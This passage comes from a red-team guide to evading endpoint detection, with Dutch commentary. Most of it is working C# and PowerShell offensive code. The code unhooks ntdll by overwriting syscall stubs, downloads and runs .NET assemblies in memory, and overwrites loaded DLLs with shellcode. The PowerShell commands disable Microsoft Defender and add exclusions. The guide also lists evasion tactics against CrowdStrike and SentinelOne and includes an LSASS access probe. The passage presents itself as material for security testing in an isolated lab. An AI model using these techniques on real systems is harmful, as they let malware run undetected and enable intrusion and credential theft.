    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    const uint CREATE_SUSPENDED = 0x00000004;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    public static bool UnhookFromSuspendedProcess()
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        
        // Create suspended process
        if (!CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero,
            false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
        {
            Console.WriteLine("[-] Failed to create suspended process");
            return false;
        }
        
        Console.WriteLine($"[+] Created suspended process: PID {pi.dwProcessId}");
        
        try
        {
            // Get our loaded ntdll base
            IntPtr localNtdll = GetModuleHandle("ntdll.dll");
            
            // Read clean ntdll from suspended process
            // (It hasn't been hooked yet because EDR hooks on process resume/execution)
            
            // Read .text section from suspended process
            // Copy to our process, overwriting hooked version
            
            // ... (similar logic to previous example, but reading from remote process)
            
            Console.WriteLine("[+] Unhooked from suspended process");
            return true;
        }
        finally
        {
            // Clean up - terminate suspended process
            TerminateProcess(pi.hProcess, 0);
        }
    }
}
```

---

## 7.4 Unhooking Specific Functions Only

```csharp
// === UNHOOK SPECIFIC FUNCTIONS ONLY ===
// More surgical approach - less detectable

public class SelectiveUnhook
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    // Clean syscall stubs for specific functions
    static readonly Dictionary<string, byte[]> CleanStubs = new Dictionary<string, byte[]>
    {
        // NtAllocateVirtualMemory - syscall 0x18 (Win10 21H2)
        { "NtAllocateVirtualMemory", new byte[] { 
            0x4C, 0x8B, 0xD1,                   // mov r10, rcx
            0xB8, 0x18, 0x00, 0x00, 0x00,       // mov eax, 0x18
            0x0F, 0x05,                          // syscall
            0xC3                                 // ret
        }},
        
        // NtWriteVirtualMemory - syscall 0x3A
        { "NtWriteVirtualMemory", new byte[] {
            0x4C, 0x8B, 0xD1,
            0xB8, 0x3A, 0x00, 0x00, 0x00,
            0x0F, 0x05,
            0xC3
        }},
        
        // NtProtectVirtualMemory - syscall 0x50
        { "NtProtectVirtualMemory", new byte[] {
            0x4C, 0x8B, 0xD1,
            0xB8, 0x50, 0x00, 0x00, 0x00,
            0x0F, 0x05,
            0xC3
        }},
        
        // NtCreateThreadEx - syscall 0xC7
        { "NtCreateThreadEx", new byte[] {
            0x4C, 0x8B, 0xD1,
            0xB8, 0xC7, 0x00, 0x00, 0x00,
            0x0F, 0x05,
            0xC3
        }}
    };
    
    public static bool UnhookFunction(string functionName)
    {
        if (!CleanStubs.ContainsKey(functionName))
        {
            Console.WriteLine($"[-] Unknown function: {functionName}");
            return false;
        }
        
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr funcAddr = GetProcAddress(ntdll, functionName);
        
        if (funcAddr == IntPtr.Zero)
        {
            Console.WriteLine($"[-] Function not found: {functionName}");
            return false;
        }
        
        byte[] cleanStub = CleanStubs[functionName];
        
        uint oldProtect;
        VirtualProtect(funcAddr, (UIntPtr)cleanStub.Length, 0x40, out oldProtect);
        Marshal.Copy(cleanStub, 0, funcAddr, cleanStub.Length);
        VirtualProtect(funcAddr, (UIntPtr)cleanStub.Length, oldProtect, out oldProtect);
        
        Console.WriteLine($"[+] Unhooked: {functionName}");
        return true;
    }
    
    public static void UnhookAll()
    {
        foreach (var func in CleanStubs.Keys)
        {
            UnhookFunction(func);
        }
    }
}
```

> **📘 SENIOR INSIGHT:**
> **Selective unhooking vs full unhooking:**
>
> | Approach | Voordelen | Nadelen |
> |----------|-----------|---------|
> | Full unhook | Complete bypass | Meer detecteerbaar |
> | Selective | Minder opvallend | Moet syscall numbers weten |
> | Syscall only | Cleanst | Complex, version-dependent |

---

# 8. MEMORY-ONLY TECHNIQUES

## 8.1 In-Memory Execution

```csharp
// === EXECUTE .NET ASSEMBLY FROM MEMORY ===
// No file on disk

using System;
using System.Reflection;
using System.Net;

public class InMemoryExec
{
    public static void ExecuteFromUrl(string url)
    {
        // Download assembly bytes
        WebClient client = new WebClient();
        byte[] assemblyBytes = client.DownloadData(url);
        
        // Load assembly from memory
        Assembly assembly = Assembly.Load(assemblyBytes);
        
        // Find entry point
        MethodInfo entryPoint = assembly.EntryPoint;
        
        // Execute
        entryPoint.Invoke(null, new object[] { new string[] { } });
    }
    
    public static void ExecuteFromBase64(string base64)
    {
        byte[] assemblyBytes = Convert.FromBase64String(base64);
        Assembly assembly = Assembly.Load(assemblyBytes);
        assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
    }
}
```

---

## 8.2 Module Stomping

```csharp
// === MODULE STOMPING ===
// Overwrite legitimate DLL in memory with shellcode
// Execution appears to come from legitimate module

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ModuleStomping
{
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static IntPtr StompModule(string moduleName, byte[] shellcode)
    {
        // Load a legitimate but rarely used DLL
        IntPtr moduleBase = LoadLibrary(moduleName);
        
        if (moduleBase == IntPtr.Zero)
        {
            Console.WriteLine($"[-] Failed to load {moduleName}");
            return IntPtr.Zero;
        }
        
        // Find a suitable location in the module's .text section
        // (Similar PE parsing as unhooking)
        
        // Change protection to RWX
        uint oldProtect;
        VirtualProtect(moduleBase, (UIntPtr)shellcode.Length, 0x40, out oldProtect);
        
        // Write shellcode over module code
        Marshal.Copy(shellcode, 0, moduleBase, shellcode.Length);
        
        // Change to RX
        VirtualProtect(moduleBase, (UIntPtr)shellcode.Length, 0x20, out oldProtect);
        
        Console.WriteLine($"[+] Stomped {moduleName} at 0x{moduleBase.ToString("X")}");
        
        return moduleBase;
    }
    
    // Good candidates for stomping:
    // - xpsservices.dll (rarely used)
    // - amsi.dll (ironic!)
    // - chakra.dll
}
```

---

## 8.3 Phantom DLL Hollowing

```csharp
// === PHANTOM DLL HOLLOWING ===
// Map DLL from transaction, hollow it, execute

// This technique:
// 1. Creates NTFS transaction
// 2. Maps DLL within transaction
// 3. Overwrites with shellcode
// 4. Creates section from modified file
// 5. Maps section (contains shellcode but appears as legit DLL)
// 6. Rollback transaction (file on disk unchanged)

// Complex implementation - requires:
// - NtCreateTransaction
// - NtCreateFile with transaction
// - NtCreateSection
// - NtMapViewOfSection
// - NtRollbackTransaction

// Result: Shellcode executes from what appears to be legitimate DLL
// No file modification on disk
```

---

# 9. EDR-SPECIFIC BYPASSES

## 9.1 Microsoft Defender Bypass Techniques

```powershell
# === DEFENDER-SPECIFIC BYPASSES ===

# 1. AMSI Bypass (see earlier section)

# 2. Defender Exclusions
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionExtension ".ps1"

# 3. Disable Defender (requires admin + tamper protection off)
Set-MpPreference -DisableRealtimeMonitoring $true

# 4. Controlled Folder Access bypass
# If enabled, whitelist your process

# 5. Cloud Protection bypass
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

# 6. Attack Surface Reduction rules
# Check current rules
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions

# Disable specific rule (requires admin)
# Add-MpPreference -AttackSurfaceReductionRules_Ids <GUID> -AttackSurfaceReductionRules_Actions Disabled
```

---

## 9.2 CrowdStrike Evasion

```yaml
CrowdStrike Evasion Strategies:

Known Techniques That May Work:
  - Direct syscalls (but they're catching on)
  - Sleep obfuscation
  - Hardware breakpoint injection
  - Timestamp manipulation
  - Process hollowing variants

Known Detections to Avoid:
  - Standard process injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
  - LSASS access
  - Cobalt Strike default malleable C2
  - Common PowerShell download cradles
  
Recommendations:
  - Use fresh, custom tooling
  - Avoid known IOCs
  - Sleep between actions
  - Blend with normal traffic
  - Use legitimate cloud services for C2
```

---

## 9.3 SentinelOne Evasion

```yaml
SentinelOne Evasion Strategies:

Effective Techniques:
  - Full ntdll unhooking (from disk)
  - Direct syscalls
  - Delayed execution (sandbox timeout)
  - User interaction requirement

Detected Patterns:
  - Standard injection
  - Memory allocation patterns (RWX)
  - Known malware signatures
  - Behavioral patterns (rapid enumeration)
  
Local AI Bypass:
  - Slow operations (avoid burst activity)
  - Use legitimate tools
  - Avoid known malware behaviors
  - Encrypt payloads with unique keys
```

---

## 9.4 Generic EDR Evasion Checklist

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    EDR EVASION CHECKLIST                                       ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  STATIC EVASION                                                               ║
║  ☐ Payload encrypted/obfuscated                                               ║
║  ☐ No known signatures                                                        ║
║  ☐ Strings encrypted                                                          ║
║  ☐ API calls obfuscated (hashing)                                             ║
║  ☐ Clean IAT (dynamic resolution)                                             ║
║  ☐ Signed binary (if possible)                                                ║
║                                                                               ║
║  RUNTIME EVASION                                                              ║
║  ☐ AMSI bypassed                                                              ║
║  ☐ ETW disabled                                                               ║
║  ☐ Hooks removed or bypassed                                                  ║
║  ☐ Direct syscalls for sensitive operations                                   ║
║  ☐ RW then RX (not RWX)                                                       ║
║  ☐ Sleep/delay between actions                                                ║
║                                                                               ║
║  BEHAVIORAL EVASION                                                           ║
║  ☐ Legitimate parent process                                                  ║
║  ☐ Normal process tree                                                        ║
║  ☐ Injection into common processes                                            ║
║  ☐ Execution during business hours                                            ║
║  ☐ No suspicious network patterns                                             ║
║  ☐ Blend with normal traffic                                                  ║
║                                                                               ║
║  TESTING                                                                      ║
║  ☐ Tested against target EDR                                                  ║
║  ☐ Tested in similar environment                                              ║
║  ☐ Fallback techniques ready                                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

# 10. TESTING & VALIDATION

## 10.1 Safe Testing Environment

```yaml
Lab Setup for EDR Testing:

Virtual Environment:
  - VMware/Hyper-V isolated network
  - Snapshot before testing
  - No internet (or controlled)
  
EDR Installations:
  - Windows Defender (free)
  - CrowdStrike Falcon (trial/test license)
  - SentinelOne (trial)
  - Carbon Black (trial)
  
Testing Process:
  1. Snapshot clean VM
  2. Install EDR
  3. Let EDR establish baseline
  4. Execute payload
  5. Document results
  6. Check EDR console for detections
  7. Restore snapshot
  8. Modify payload
  9. Repeat
```

---

## 10.2 Detection Testing Script

```powershell
# === EDR DETECTION TEST SCRIPT ===

# Test 1: Basic AMSI detection
Write-Host "[*] Testing AMSI..."
try {
    Invoke-Expression 'Invoke-Mimikatz'
} catch {
    Write-Host "[!] AMSI blocked Mimikatz string"
}

# Test 2: Suspicious memory allocation
Write-Host "[*] Testing memory allocation..."
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@
Add-Type -MemberDefinition $code -Name "Mem" -Namespace "Win32"
$mem = [Win32.Mem]::VirtualAlloc([IntPtr]::Zero, 4096, 0x3000, 0x40)
Write-Host "[+] Allocated RWX memory at: $mem"

# Test 3: Process injection pattern
Write-Host "[*] Testing process injection APIs..."
# This would trigger most EDRs

# Test 4: LSASS access
Write-Host "[*] Testing LSASS handle..."
try {
    $proc = Get-Process lsass
    $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
    Write-Host "[!] Got LSASS handle - EDR should alert"
} catch {
    Write-Host "[+] LSASS access blocked"
}

# Test 5: Credential dumping command
Write-Host "[*] Testing credential dump commands..."
# These strings alone may trigger alerts
# "sekurlsa::logonpasswords"
# "lsadump::sam"
```

---

**EINDE EDR EVASION DEEP DIVE**

---

*Dit document bevat geavanceerde EDR evasion technieken.*
*Kennis hiervan is essentieel voor senior red team operators.*
*Test altijd in een geïsoleerde lab omgeving.*

